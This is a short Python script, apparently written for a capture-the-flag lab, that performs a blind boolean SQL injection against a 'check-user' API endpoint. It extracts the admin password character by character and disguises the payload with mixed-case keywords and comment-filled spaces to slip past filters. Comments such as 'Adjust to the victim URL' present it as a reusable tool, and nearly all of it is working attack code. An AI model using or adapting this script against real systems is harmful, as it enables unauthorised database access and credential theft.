#!/usr/bin/python3
import httplib2, string, urllib.parse

flag = ""
password = ""
#alphabet = string.ascii_letters + string.digits + "._@{}-/()!\$%=^[]:#&/"
payload = ""
#Adjust to the victim URL
URL = "http://10.129.40.105:8080/api/v1/check-user?u="
http = httplib2.Http()


#Exfiltrate the Admin Password
#Adjust if you need bigger, first find the passwd lenght
for i in range(100
               ): 
    for c in range(32,126):
        #Adjust the URL encoded params in the bodyclear
        params = f"admin' AnD AsCiI(SubStRiNg((SeLeCt PaSsWoRd FrOm UsErS WhErE username='admin'),{i},1))='{c}'--"
        #Replace spaces with  /**/
        params = params.replace(" ", "/*/**/*/")
        #Replace comments with  /**/
        params = params.replace("--", "-/**/-")
        #URL Encode the payload
        params = urllib.parse.quote_plus(str(params))
        send = http.request(str(URL+params), method="GET")[1]
        #Adjust the success message, in this case since admin=always true the other condition must be false in other to get FALSE=taken and stop the cycle 
        if ("true" in send.decode()): 
            flag += chr(c) 
            print("Data is:" + flag)
            break
